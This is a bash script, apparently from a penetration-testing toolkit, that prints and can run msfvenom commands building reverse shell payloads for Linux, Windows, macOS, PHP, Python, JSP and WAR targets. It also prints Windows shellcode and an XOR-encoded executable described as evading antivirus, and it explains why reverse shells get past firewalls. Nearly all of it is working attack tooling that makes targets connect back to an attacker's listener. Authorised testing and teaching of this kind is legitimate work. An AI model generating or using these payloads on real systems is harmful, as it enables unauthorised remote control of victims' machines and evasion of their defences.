#!/usr/bin/env bash
# ============================================================================
# @description  Generate platform-specific reverse shell payloads
# @usage        metasploit/generate-reverse-shell.sh [target] [-h|--help] [-x|--execute] [-j|--json]
# @dependencies msfconsole, common.sh
# ============================================================================
source "$(dirname "$0")/../common.sh"

show_help() {
    echo "Usage: $(basename "$0") [LHOST] [LPORT] [-h|--help] [-j|--json]"
    echo ""
    echo "Description:"
    echo "  Generates reverse shell payloads for various platforms using msfvenom."
    echo "  Shows commands for Linux, Windows, macOS, PHP, Python, Java, and more."
    echo "  Auto-detects local IP if LHOST is not provided. Default LPORT is 4444."
    echo ""
    echo "Examples:"
    echo "  $(basename "$0")                    # Use auto-detected IP, port 4444"
    echo "  $(basename "$0") 10.0.0.5           # Use specific LHOST"
    echo "  $(basename "$0") 10.0.0.5 9001      # Use specific LHOST and LPORT"
    echo "  $(basename "$0") --help             # Show this help message"
    echo ""
    echo "Flags:"
    echo "  -h, --help     Show this help message"
    echo "  -j, --json     Output as JSON; add -x to run and capture results (requires jq)"
    echo "  -x, --execute  Execute commands instead of displaying them"
}

parse_common_args "$@"
set -- "${REMAINING_ARGS[@]+${REMAINING_ARGS[@]}}"

require_cmd msfvenom "https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html"

LHOST="${1:-$(ipconfig getifaddr en0 2>/dev/null || echo '10.0.0.1')}"
LPORT="${2:-4444}"

json_set_meta "metasploit" "$LHOST" "exploitation"

confirm_execute
safety_banner

info "=== Reverse Shell Payload Generation ==="
info "LHOST: ${LHOST}"
info "LPORT: ${LPORT}"
echo ""

info "Reverse shells vs bind shells"
echo "   Bind shell: target opens a port, attacker connects to it."
echo "   Reverse shell: target connects BACK to the attacker's listener."
echo ""
echo "   Reverse shells are preferred because:"
echo "   - They bypass firewalls (outbound connections usually allowed)"
echo "   - No need for the target to have open inbound ports"
echo "   - NAT traversal — works even if target is behind a router"
echo ""
echo "   msfvenom replaced the older msfpayload + msfencode tools."
echo "   It generates payloads in any format: EXE, ELF, PHP, Python, etc."
echo ""

# 1. Linux reverse shell
info "1) Linux reverse shell (ELF)"
echo "   msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
echo ""
json_add_example "1) Linux reverse shell (ELF)" \
    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"

# 2. Windows reverse shell
info "2) Windows reverse shell (EXE)"
echo "   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o shell.exe"
echo ""
json_add_example "2) Windows reverse shell (EXE)" \
    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o shell.exe"

# 3. PHP reverse shell
info "3) PHP reverse shell"
echo "   msfvenom -p php/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.php"
echo ""
json_add_example "3) PHP reverse shell" \
    "msfvenom -p php/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.php"

# 4. Python reverse shell
info "4) Python reverse shell"
echo "   msfvenom -p python/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.py"
echo ""
json_add_example "4) Python reverse shell" \
    "msfvenom -p python/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.py"

# 5. JSP reverse shell
info "5) JSP reverse shell (for Tomcat)"
echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.jsp"
echo ""
json_add_example "5) JSP reverse shell (for Tomcat)" \
    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.jsp"

# 6. WAR file
info "6) WAR file (deploy to Tomcat/JBoss)"
echo "   msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o shell.war"
echo ""
json_add_example "6) WAR file (deploy to Tomcat/JBoss)" \
    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o shell.war"

# 7. Windows shellcode
info "7) Windows shellcode for custom exploit"
echo "   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f c"
echo ""
json_add_example "7) Windows shellcode for custom exploit" \
    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f c"

# 8. macOS reverse shell
info "8) macOS reverse shell"
echo "   msfvenom -p osx/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f macho -o shell.macho"
echo ""
json_add_example "8) macOS reverse shell" \
    "msfvenom -p osx/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f macho -o shell.macho"

# 9. Encoded payload
info "9) Encoded payload to evade basic AV"
echo "   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -e x64/xor_dynamic -f exe -o encoded.exe"
echo ""
json_add_example "9) Encoded payload to evade basic AV" \
    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -e x64/xor_dynamic -f exe -o encoded.exe"

# 10. List payloads
info "10) List all available payloads for a platform"
echo "    msfvenom --list payloads | grep linux/x64"
echo ""
json_add_example "10) List all available payloads for a platform" \
    "msfvenom --list payloads | grep linux/x64"

json_finalize

# Interactive demo (skip if non-interactive)
if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
    [[ ! -t 0 ]] && exit 0

    echo ""
    info "Your detected local IP: ${LHOST}"
    info "To generate a Linux reverse shell, you would run:"
    echo ""
    echo "   msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
    echo ""
    read -rp "Generate this payload now? [y/N] " answer
    if [[ "$answer" =~ ^[Yy]$ ]]; then
        info "Running: msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf"
        echo ""
        msfvenom -p linux/x64/shell_reverse_tcp LHOST="${LHOST}" LPORT="${LPORT}" -f elf -o shell.elf
    fi
fi
